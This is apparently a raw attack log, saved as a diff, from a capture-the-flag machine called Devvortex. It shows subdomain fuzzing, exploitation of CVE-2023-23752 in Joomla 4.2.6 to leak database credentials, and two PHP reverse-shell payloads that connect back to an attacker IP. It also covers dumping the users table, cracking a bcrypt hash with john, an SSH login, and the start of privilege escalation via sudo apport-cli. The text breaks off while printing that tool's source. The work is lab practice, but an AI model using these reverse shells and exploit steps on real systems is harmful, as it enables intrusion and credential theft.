@@ -1,0 +1,1164 @@
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.242/ -H "Host: FUZZ.devvortex.htb" -t 50 --hc 404,302
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.242/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000019:   200        501 L    1581 W     23221 Ch    "dev"                                               
+
+Total time: 0
+Processed Requests: 19966
+Filtered Requests: 19965
+Requests/sec.: 0
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# feroxbuster -u http://10.10.11.242/ -H "Host: devvortex.htb" -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,bak
+                                                                                                                     
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.242/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🤯  Header                │ Host: devvortex.htb
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, txt, bak]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        6l       57w     1878c http://10.10.11.242/images/youtube.png
+200      GET       44l      290w    17183c http://10.10.11.242/images/c-1.png
+200      GET        5l       23w     1217c http://10.10.11.242/images/location-white.png
+200      GET      254l      520w     7603c http://10.10.11.242/do.html
+200      GET        3l       10w      667c http://10.10.11.242/images/telephone-white.png
+200      GET        5l       55w     1797c http://10.10.11.242/images/linkedin.png
+200      GET        6l       13w      639c http://10.10.11.242/images/quote.png
+200      GET       11l       50w     2892c http://10.10.11.242/images/d-1.png
+200      GET       11l       39w     3419c http://10.10.11.242/images/d-4.png
+200      GET        6l       52w     1968c http://10.10.11.242/images/twitter.png
+200      GET      289l      573w     8884c http://10.10.11.242/contact.html
+200      GET        5l       48w     1493c http://10.10.11.242/images/fb.png
+200      GET      100l      178w     1904c http://10.10.11.242/css/responsive.css
+200      GET        5l       12w      847c http://10.10.11.242/images/envelope-white.png
+200      GET        9l       24w     2405c http://10.10.11.242/images/d-2.png
+200      GET      229l      475w     6845c http://10.10.11.242/portfolio.html
+200      GET        7l       30w     2018c http://10.10.11.242/images/d-3.png
+200      GET       87l      363w    24853c http://10.10.11.242/images/c-3.png
+200      GET       71l      350w    24351c http://10.10.11.242/images/c-2.png
+200      GET      714l     1381w    13685c http://10.10.11.242/css/style.css
+200      GET      583l     1274w    18048c http://10.10.11.242/index.html
+200      GET      348l     2369w   178082c http://10.10.11.242/images/map-img.png
+200      GET      536l     2364w   201645c http://10.10.11.242/images/who-img.jpg
+200      GET      231l      545w     7388c http://10.10.11.242/about.html
+200      GET     4436l    10973w   131638c http://10.10.11.242/js/bootstrap.js
+403      GET        7l       10w      162c http://10.10.11.242/css/
+200      GET      636l     3934w   306731c http://10.10.11.242/images/w-2.png
+200      GET      512l     2892w   241721c http://10.10.11.242/images/w-4.png
+200      GET        2l     1276w    88145c http://10.10.11.242/js/jquery-3.4.1.min.js
+403      GET        7l       10w      162c http://10.10.11.242/js/
+200      GET      675l     4019w   330600c http://10.10.11.242/images/w-1.png
+200      GET    10038l    19587w   192348c http://10.10.11.242/css/bootstrap.css
+200      GET      536l     3109w   243112c http://10.10.11.242/images/w-3.png
+200      GET      583l     1274w    18048c http://10.10.11.242/
+403      GET        7l       10w      162c http://10.10.11.242/images/
+200      GET        5l       14w     1227c http://10.10.11.242/images/insta.png
+301      GET        7l       12w      178c http://10.10.11.242/css => http://devvortex.htb/css/
+301      GET        7l       12w      178c http://10.10.11.242/images => http://devvortex.htb/images/
+301      GET        7l       12w      178c http://10.10.11.242/js => http://devvortex.htb/js/
+[####################] - 38s    92470/92470   0s      found:39      errors:0      
+[####################] - 36s    23070/23070   636/s   http://10.10.11.242/ 
+[####################] - 36s    23070/23070   633/s   http://10.10.11.242/images/ 
+[####################] - 36s    23070/23070   640/s   http://10.10.11.242/css/ 
+[####################] - 36s    23070/23070   637/s   http://10.10.11.242/js/                                                                                                                                                             
+┌──(root㉿kali)-[/home/kali]
+└─# 
+301      GET        7l       12w      178c http://10.10.11.242/plugins => http://dev.devvortex.htb/plugins/
+301      GET        7l       12w      178c http://10.10.11.242/components => http://dev.devvortex.htb/components/
+301      GET        7l       12w      178c http://10.10.11.242/tmp => http://dev.devvortex.htb/tmp/
+301      GET        7l       12w      178c http://10.10.11.242/language => http://dev.devvortex.htb/language/
+301      GET        7l       12w      178c http://10.10.11.242/administrator => http://dev.devvortex.htb/administrator/
+301      GET        7l       12w      178c http://10.10.11.242/cli => http://dev.devvortex.htb/cli/
+301      GET        7l       12w      178c http://10.10.11.242/modules => http://dev.devvortex.htb/modules/
+301      GET        7l       12w      178c http://10.10.11.242/api => http://dev.devvortex.htb/api/
+301      GET        7l       12w      178c http://10.10.11.242/layouts => http://dev.devvortex.htb/layouts/
+301      GET        7l       12w      178c http://10.10.11.242/libraries => http://dev.devvortex.htb/libraries/
+301      GET        7l       12w      178c http://10.10.11.242/cache => http://dev.devvortex.htb/cache/
+301      GET        7l       12w      178c http://10.10.11.242/includes => http://dev.devvortex.htb/includes/
+404      GET       69l      208w     3653c http://10.10.11.242/logs
+404      GET       69l      208w     3653c http://10.10.11.242/installation
+404      GET       69l      208w     3653c http://10.10.11.242/bin
+
+administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
+api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
+cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 35ms]
+components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 31ms]
+home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 1625ms]
+images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
+includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 77ms]
+index.php               [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 1970ms]
+language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 57ms]
+layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 121ms]
+libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 31ms]
+media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 27ms]
+modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
+plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 27ms]
+robots.txt              [Status: 200, Size: 764, Words: 78, Lines: 30, Duration: 30ms]
+templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 30ms]
+tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 93ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 18 req/sec :: Duration: [0:02:39] :: Errors: 0 ::
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+
+http://dev.devvortex.htb/administrator/
+Joomla! instance
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -s -H "Host: dev.devvortex.htb" http://10.10.11.242/administrator/manifests/files/joomla.xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<extension type="file" method="upgrade">
+	<name>files_joomla</name>
+	<author>Joomla! Project</author>
+	<authorEmail>admin@joomla.org</authorEmail>
+	<authorUrl>www.joomla.org</authorUrl>
+	<copyright>(C) 2019 Open Source Matters, Inc.</copyright>
+	<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
+	<version>4.2.6</version>
+	<creationDate>2022-12</creationDate>
+	<description>FILES_JOOMLA_XML_DESCRIPTION</description>
+
+	<scriptfile>administrator/components/com_admin/script.php</scriptfile>
+
+	<update>
+		<schemas>
+			<schemapath type="mysql">administrator/components/com_admin/sql/updates/mysql</schemapath>
+			<schemapath type="postgresql">administrator/components/com_admin/sql/updates/postgresql</schemapath>
+		</schemas>
+	</update>
+
+	<fileset>
+		<files>
+			<folder>administrator</folder>
+			<folder>api</folder>
+			<folder>cache</folder>
+			<folder>cli</folder>
+			<folder>components</folder>
+			<folder>images</folder>
+			<folder>includes</folder>
+			<folder>language</folder>
+			<folder>layouts</folder>
+			<folder>libraries</folder>
+			<folder>media</folder>
+			<folder>modules</folder>
+			<folder>plugins</folder>
+			<folder>templates</folder>
+			<folder>tmp</folder>
+			<file>htaccess.txt</file>
+			<file>web.config.txt</file>
+			<file>LICENSE.txt</file>
+			<file>README.txt</file>
+			<file>index.php</file>
+		</files>
+	</fileset>
+
+	<updateservers>
+		<server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
+	</updateservers>
+</extension>
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+Joomla! 4.2.6
+CVE-2023-23752
+https://www.exploit-db.com/exploits/51334
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -s -H "Host: dev.devvortex.htb" "http://10.10.11.242/api/index.php/v1/users?public=true" | jq '.data[] | select(.type=="users") | {id:.attributes.id, name:.attributes.name, username:.attributes.username, email:.attributes.email, groups:.attributes.group_names}'
+
+{
+  "id": 649,
+  "name": "lewis",
+  "username": "lewis",
+  "email": "lewis@devvortex.htb",
+  "groups": "Super Users"
+}
+{
+  "id": 650,
+  "name": "logan paul",
+  "username": "logan",
+  "email": "logan@devvortex.htb",
+  "groups": "Registered"
+}
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl -s -H "Host: dev.devvortex.htb" "http://10.10.11.242/api/index.php/v1/config/application?public=true" | jq '.data[] | select(.type=="application") | .attributes'
+{
+  "offline": false,
+  "id": 224
+}
+{
+  "offline_message": "This site is down for maintenance.<br>Please check back again soon.",
+  "id": 224
+}
+{
+  "display_offline_message": 1,
+  "id": 224
+}
+{
+  "offline_image": "",
+  "id": 224
+}
+{
+  "sitename": "Development",
+  "id": 224
+}
+{
+  "editor": "tinymce",
+  "id": 224
+}
+{
+  "captcha": "0",
+  "id": 224
+}
+{
+  "list_limit": 20,
+  "id": 224
+}
+{
+  "access": 1,
+  "id": 224
+}
+{
+  "debug": false,
+  "id": 224
+}
+{
+  "debug_lang": false,
+  "id": 224
+}
+{
+  "debug_lang_const": true,
+  "id": 224
+}
+{
+  "dbtype": "mysqli",
+  "id": 224
+}
+{
+  "host": "localhost",
+  "id": 224
+}
+{
+  "user": "lewis",
+  "id": 224
+}
+{
+  "password": "P4ntherg0t1n5r3c0n##",
+  "id": 224
+}
+{
+  "db": "joomla",
+  "id": 224
+}
+{
+  "dbprefix": "sd4fg_",
+  "id": 224
+}
+{
+  "dbencryption": 0,
+  "id": 224
+}
+{
+  "dbsslverifyservercert": false,
+  "id": 224
+}
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+creds
+lewis:P4ntherg0t1n5r3c0n##
+
+
+edit php file to call our machine.
+
+ <?php
+   function reverseShell() {
+       $sock = @fsockopen("10.10.14.16", 9001);
+       if ($sock) {
+           $descriptors = array(
+               0 => array("pipe", "r"),
+               1 => array("pipe", "w"),
+               2 => array("pipe", "w")
+           );
+           $process = proc_open('/bin/sh', $descriptors, $pipes);
+           if (is_resource($process)) {
+               stream_set_blocking($sock, 0);
+               stream_set_blocking($pipes[0], 0);
+               stream_set_blocking($pipes[1], 0);
+               stream_set_blocking($pipes[2], 0);
+               while (1) {
+                   $read = array($sock, $pipes[1], $pipes[2]);
+                   $write = array($pipes[0]);
+                   $except = null;
+                   if (stream_select($read, $write, $except, 0, 500000) === false) {
+                       break;
+                   }
+                   // Read from socket and write to shell's stdin
+                   if (in_array($sock, $read)) {
+                       $input = fread($sock, 4096);
+                       if ($input === false || $input === '') {
+                           break;
+                       }
+                       fwrite($pipes[0], $input);
+                   }
+                   // Read from shell's stdout and stderr and write to socket
+                   foreach (array(1, 2) as $pipe) {
+                       if (in_array($pipes[$pipe], $read)) {
+                           $output = fread($pipes[$pipe], 4096);
+                           if ($output === false || $output === '') {
+                               break 2;
+                           }
+                           fwrite($sock, $output);
+                       }
+                   }
+               }
+               fclose($sock);
+               proc_close($process);
+           }
+       }
+   }
+   // Run in background without waiting
+   register_shutdown_function('reverseShell');
+   ?>
+
+
+even better
+
+<?php
+// Reverse shell code (executed in the background)
+shell_exec('php -r \'$sock=fsockopen("10.10.14.16",9001);system("sh <&3 >&3 2>&3");\' > /dev/null 2>&1 &');
+?>
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9001  
+listening on [any] 9001 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.242] 57770
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@devvortex:~/dev.devvortex.htb$ ^C
+www-data@devvortex:~/dev.devvortex.htb$ ^C
+www-data@devvortex:~/dev.devvortex.htb$ ^C
+www-data@devvortex:~/dev.devvortex.htb$ ^C
+www-data@devvortex:~/dev.devvortex.htb$ ss -tlpn
+State  Recv-Q Send-Q  Local Address:Port    Peer Address:Port Process                                                
+LISTEN 0      70          127.0.0.1:33060        0.0.0.0:*                                                           
+LISTEN 0      151         127.0.0.1:3306         0.0.0.0:*                                                           
+LISTEN 0      511           0.0.0.0:80           0.0.0.0:*     users:(("nginx",pid=932,fd=8),("nginx",pid=931,fd=8)) 
+LISTEN 0      4096    127.0.0.53%lo:53           0.0.0.0:*                                                           
+LISTEN 0      128           0.0.0.0:22           0.0.0.0:*                                                           
+LISTEN 0      511              [::]:80              [::]:*     users:(("nginx",pid=932,fd=9),("nginx",pid=931,fd=9)) 
+LISTEN 0      128              [::]:22              [::]:*                                                           
+www-data@devvortex:~/dev.devvortex.htb$ 
+ww-data@devvortex:~/dev.devvortex.htb$ cat configuration.php
+<?php
+class JConfig {
+	public $offline = false;
+	public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
+	public $display_offline_message = 1;
+	public $offline_image = '';
+	public $sitename = 'Development';
+	public $editor = 'tinymce';
+	public $captcha = '0';
+	public $list_limit = 20;
+	public $access = 1;
+	public $debug = false;
+	public $debug_lang = false;
+	public $debug_lang_const = true;
+	public $dbtype = 'mysqli';
+	public $host = 'localhost';
+	public $user = 'lewis';
+	public $password = 'P4ntherg0t1n5r3c0n##';
+	public $db = 'joomla';
+	public $dbprefix = 'sd4fg_';
+	public $dbencryption = 0;
+	public $dbsslverifyservercert = false;
+	public $dbsslkey = '';
+	public $dbsslcert = '';
+	public $dbsslca = '';
+	public $dbsslcipher = '';
+	public $force_ssl = 0;
+	public $live_site = '';
+	public $secret = 'ZI7zLTbaGKliS9gq';
+	public $gzip = false;
+	public $error_reporting = 'default';
+	public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
+	public $offset = 'UTC';
+	public $mailonline = true;
+	public $mailer = 'mail';
+	public $mailfrom = 'lewis@devvortex.htb';
+	public $fromname = 'Development';
+	public $sendmail = '/usr/sbin/sendmail';
+	public $smtpauth = false;
+	public $smtpuser = '';
+	public $smtppass = '';
+	public $smtphost = 'localhost';
+	public $smtpsecure = 'none';
+	public $smtpport = 25;
+	public $caching = 0;
+	public $cache_handler = 'file';
+	public $cachetime = 15;
+	public $cache_platformprefix = false;
+	public $MetaDesc = '';
+	public $MetaAuthor = true;
+	public $MetaVersion = false;
+	public $robots = '';
+	public $sef = true;
+	public $sef_rewrite = false;
+	public $sef_suffix = false;
+	public $unicodeslugs = false;
+	public $feed_limit = 10;
+	public $feed_email = 'none';
+	public $log_path = '/var/www/dev.devvortex.htb/administrator/logs';
+	public $tmp_path = '/var/www/dev.devvortex.htb/tmp';
+	public $lifetime = 15;
+	public $session_handler = 'database';
+	public $shared_session = false;
+	public $session_metadata = true;
+}www-data@devvortex:~/dev.devvortex.htb$ 
+}www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 20119
+Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| joomla             |
+| performance_schema |
++--------------------+
+3 rows in set (0.01 sec)
+
+mysql> use joomla;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-------------------------------+
+| Tables_in_joomla              |
++-------------------------------+
+| sd4fg_action_log_config       |
+| sd4fg_action_logs             |
+| sd4fg_action_logs_extensions  |
+| sd4fg_action_logs_users       |
+| sd4fg_assets                  |
+| sd4fg_associations            |
+| sd4fg_banner_clients          |
+| sd4fg_banner_tracks           |
+| sd4fg_banners                 |
+| sd4fg_categories              |
+| sd4fg_contact_details         |
+| sd4fg_content                 |
+| sd4fg_content_frontpage       |
+| sd4fg_content_rating          |
+| sd4fg_content_types           |
+| sd4fg_contentitem_tag_map     |
+| sd4fg_extensions              |
+| sd4fg_fields                  |
+| sd4fg_fields_categories       |
+| sd4fg_fields_groups           |
+| sd4fg_fields_values           |
+| sd4fg_finder_filters          |
+| sd4fg_finder_links            |
+| sd4fg_finder_links_terms      |
+| sd4fg_finder_logging          |
+| sd4fg_finder_taxonomy         |
+| sd4fg_finder_taxonomy_map     |
+| sd4fg_finder_terms            |
+| sd4fg_finder_terms_common     |
+| sd4fg_finder_tokens           |
+| sd4fg_finder_tokens_aggregate |
+| sd4fg_finder_types            |
+| sd4fg_history                 |
+| sd4fg_languages               |
+| sd4fg_mail_templates          |
+| sd4fg_menu                    |
+| sd4fg_menu_types              |
+| sd4fg_messages                |
+| sd4fg_messages_cfg            |
+| sd4fg_modules                 |
+| sd4fg_modules_menu            |
+| sd4fg_newsfeeds               |
+| sd4fg_overrider               |
+| sd4fg_postinstall_messages    |
+| sd4fg_privacy_consents        |
+| sd4fg_privacy_requests        |
+| sd4fg_redirect_links          |
+| sd4fg_scheduler_tasks         |
+| sd4fg_schemas                 |
+| sd4fg_session                 |
+| sd4fg_tags                    |
+| sd4fg_template_overrides      |
+| sd4fg_template_styles         |
+| sd4fg_ucm_base                |
+| sd4fg_ucm_content             |
+| sd4fg_update_sites            |
+| sd4fg_update_sites_extensions |
+| sd4fg_updates                 |
+| sd4fg_user_keys               |
+| sd4fg_user_mfa                |
+| sd4fg_user_notes              |
+| sd4fg_user_profiles           |
+| sd4fg_user_usergroup_map      |
+| sd4fg_usergroups              |
+| sd4fg_users                   |
+| sd4fg_viewlevels              |
+| sd4fg_webauthn_credentials    |
+| sd4fg_workflow_associations   |
+| sd4fg_workflow_stages         |
+| sd4fg_workflow_transitions    |
+| sd4fg_workflows               |
++-------------------------------+
+71 rows in set (0.00 sec)
+
+mysql> select * from sd4fg_users;
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-08-21 15:13:43 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
+| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+2 rows in set (0.00 sec)
+
+mysql> 
+
+┌──(root㉿kali)-[/home/kali]
+└─# hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
+Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat hash                                                               
+$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tequieromucho    (?)     
+1g 0:00:00:13 DONE (2025-08-21 11:52) 0.07199g/s 101.0p/s 101.0c/s 101.0C/s iceman..harry
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh logan@10.10.11.242
+The authenticity of host '10.10.11.242 (10.10.11.242)' can't be established.
+ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.242' (ED25519) to the list of known hosts.
+logan@10.10.11.242's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 21 Aug 2025 03:53:54 PM UTC
+
+  System load:  0.0               Processes:             169
+  Usage of /:   65.1% of 4.76GB   Users logged in:       0
+  Memory usage: 18%               IPv4 address for eth0: 10.10.11.242
+  Swap usage:   0%
+
+  => There are 3 zombie processes.
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
+logan@devvortex:~$ 
+
+logan@devvortex:~$ cat user.txt
+...
+logan@devvortex:~$ /usr/bin/apport-cli
+No pending crash reports. Try --help for more information.
+logan@devvortex:~$ sudo /usr/bin/apport-cli
+No pending crash reports. Try --help for more information.
+logan@devvortex:~$ cat /usr/bin/apport-cli
+#!/usr/bin/python3
+
+'''Command line Apport user interface.'''
+
+# Copyright (C) 2007 - 2009 Canonical Ltd.
+# Author: Michael Hofmann <mh21@piware.de>
+#
+# This program is free software; you can redistribute it and/or modify it
+# under the terms of the GNU General Public License as published by the
+# Free Software Foundation; either version 2 of the License, or (at your
+# option) any later version.  See http://www.gnu.org/copyleft/gpl.html for
+# the full text of the license.
+
+# Web browser support:
+#    w3m, lynx: do not work
+#    elinks: works
+
+from __future__ import unicode_literals
+
+import os.path, os, sys, subprocess, re, errno
+import termios, tempfile
+
+from apport import unicode_gettext as _
+import apport.ui
+
+
+class CLIDialog:
+    '''Command line dialog wrapper.'''
+
+    def __init__(self, heading, text):
+        self.heading = '\n*** ' + heading + '\n'
+        self.text = text
+        self.keys = []
+        self.buttons = []
+        self.visible = False
+
+    def raw_input_char(self, prompt, multi_char=False):
+        '''raw_input, but read a single character unless multi_char is True.
+
+        @param: prompt: the text presented to the user to solict a response.
+        @param: multi_char: Boolean True if we need to read until <enter>.
+        '''
+
+        sys.stdout.write(prompt)
+        sys.stdout.write(' ')
+        sys.stdout.flush()
+
+        file = sys.stdin.fileno()
+        saved_attributes = termios.tcgetattr(file)
+        attributes = termios.tcgetattr(file)
+        attributes[3] = attributes[3] & ~(termios.ICANON)
+        attributes[6][termios.VMIN] = 1
+        attributes[6][termios.VTIME] = 0
+        termios.tcsetattr(file, termios.TCSANOW, attributes)
+        try:
+            if multi_char:
+                response = str(sys.stdin.readline()).strip()
+            else:
+                response = str(sys.stdin.read(1))
+        finally:
+            termios.tcsetattr(file, termios.TCSANOW, saved_attributes)
+
+        sys.stdout.write('\n')
+        return response
+
+    def show(self):
+        self.visible = True
+        print(self.heading)
+        if self.text:
+            print(self.text)
+
+    def run(self, prompt=None):
+        if not self.visible:
+            self.show()
+
+        sys.stdout.write('\n')
+        try:
+            # Only one button
+            if len(self.keys) <= 1:
+                self.raw_input_char(_('Press any key to continue...'))
+                return 0
+            # Multiple choices
+            while True:
+                if prompt is not None:
+                    print(prompt)
+                else:
+                    print(_('What would you like to do? Your options are:'))
+                for index, button in enumerate(self.buttons):
+                    print('  %s: %s' % (self.keys[index], button))
+
+                if len(self.keys) <= 10:
+                    # A 10 option prompt would can still be a single character
+                    # response because the 10 options listed will be 1-9 and C.
+                    # Therefore there are 10 unique responses which can be
+                    # given.
+                    multi_char = False
+                else:
+                    multi_char = True
+                response = self.raw_input_char(
+                    _('Please choose (%s):') % ('/'.join(self.keys)),
+                    multi_char)
+                try:
+                    return self.keys.index(response.upper()) + 1
+                except ValueError:
+                    pass
+        except KeyboardInterrupt:
+            sys.stdout.write('\n')
+            sys.exit(1)
+
+    def addbutton(self, button, hotkey=None):
+        if hotkey:
+            self.keys.append(hotkey)
+            self.buttons.append(button)
+        else:
+            self.keys.append(re.search('&(.)', button).group(1).upper())
+            self.buttons.append(re.sub('&', '', button))
+        return len(self.keys)
+
+
+class CLIProgressDialog(CLIDialog):
+    '''Command line progress dialog wrapper.'''
+
+    def __init__(self, heading, text):
+        CLIDialog.__init__(self, heading, text)
+        self.progresscount = 0
+
+    def set(self, progress=None):
+        self.progresscount = (self.progresscount + 1) % 5
+        if self.progresscount:
+            return
+
+        if progress is not None:
+            sys.stdout.write('\r%u%%' % (progress * 100))
+        else:
+            sys.stdout.write('.')
+        sys.stdout.flush()
+
+
+class CLIUserInterface(apport.ui.UserInterface):
+    '''Command line Apport user interface'''
+
+    def __init__(self):
+        apport.ui.UserInterface.__init__(self)
+        self.in_update_view = False
+
+    def _get_details(self):
+        '''Build report string for display.'''
+
+        details = ''
+        max_show = 1000000
+        for key in sorted(self.report):
+            # ignore internal keys
+            if key.startswith('_'):
+                continue
+            details += '== %s =================================\n' % key
+            # string value
+            keylen = len(self.report[key])
+            if not hasattr(self.report[key], 'gzipvalue') and \
+                    hasattr(self.report[key], 'isspace') and \
+                    not self.report._is_binary(self.report[key]) and \
+                    keylen < max_show:
+                s = self.report[key]
+            elif keylen >= max_show:
+                s = _('(%i bytes)') % keylen
+            else:
+                s = _('(binary data)')
+
+            if isinstance(s, bytes):
+                s = s.decode('UTF-8', errors='ignore')
+            details += s
+            details += '\n\n'
+
+        return details
+
+    def ui_update_view(self):
+        self.in_update_view = True
+        report = self._get_details()
+        try:
+            p = subprocess.Popen(['/usr/bin/sensible-pager'], stdin=subprocess.PIPE)
+            p.communicate(report.encode('UTF-8'))
+        except IOError as e:
+            # ignore broken pipe (premature quit)
+            if e.errno == errno.EPIPE:
+                pass
+            else:
+                raise
+        self.in_update_view = False
+
+    #
+    # ui_* implementation of abstract UserInterface classes
+    #
+
+    def ui_present_report_details(self, allowed_to_report=True, modal_for=None):
+        dialog = CLIDialog(_('Send problem report to the developers?'),
+                           _('After the problem report has been sent, please fill out the form in the\n'
+                             'automatically opened web browser.'))
+
+        complete = dialog.addbutton(_('&Send report (%s)') %
+                                    self.format_filesize(self.get_complete_size()))
+
+        if self.can_examine_locally():
+            examine = dialog.addbutton(_('&Examine locally'))
+        else:
+            examine = None
+
+        view = dialog.addbutton(_('&View report'))
+        save = dialog.addbutton(_('&Keep report file for sending later or copying to somewhere else'))
+        ignore = dialog.addbutton(_('Cancel and &ignore future crashes of this program version'))
+
+        dialog.addbutton(_('&Cancel'))
+
+        while True:
+            response = dialog.run()
+
+            return_value = {'restart': False, 'blacklist': False, 'remember': False,
